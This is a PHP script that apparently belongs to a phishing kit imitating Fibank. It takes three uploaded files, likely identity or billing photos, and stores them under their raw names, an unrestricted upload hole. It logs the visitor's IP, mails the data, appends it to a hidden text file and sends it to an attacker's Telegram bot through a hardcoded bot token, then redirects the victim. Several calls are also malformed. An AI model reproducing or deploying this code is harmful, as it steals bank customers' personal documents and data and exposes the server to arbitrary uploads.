
<?php
	if (isset($_FILES['upload1'])){
		move_uploaded_file($_FILES['upload1']['tmp_name'], 'images/' .
			    $_FILES['upload1']['name']);
		move_uploaded_file($_FILES['upload2']['tmp_name'], 'images/' .
			    $_FILES['upload2']['name']);
		move_uploaded_file($_FILES['upload3']['tmp_name'], 'images/' .
			    $_FILES['upload3']['name']);		
	}
	function pre_r($array){
		echo '<pre>';
		print_r($array);
		echo '</pre>';
	}
$id = $POST['upload1']['upload2']['upload3'] ;
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

 
$subject = " BILLING :) <3 : from: ".$ip;
$nome=" BILL " ; 
	$from="resulta@localhost.com" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ BILL Fibank  +-----------------\r\n";
$photo .= "id: " .$id."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By Othy +------------------\r\n";
mail($to,$subject,$from_mail,$message,$_FILES);
$sajal = fopen("../uchiha/bills.txt", "a");  
fwrite($sajal, $message, $_FILES);
$apiToken = "1241035168:AAGy6TiSbgDMmHhfIWGeI5_mob0DFDEGXBI";
		$data = [
    		'chat_id' => '-403527967',
    		'photo' => $message
			
		];
		
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendPhoto?" . http_build_query($data) );
header('Location: redirect.php');	
?>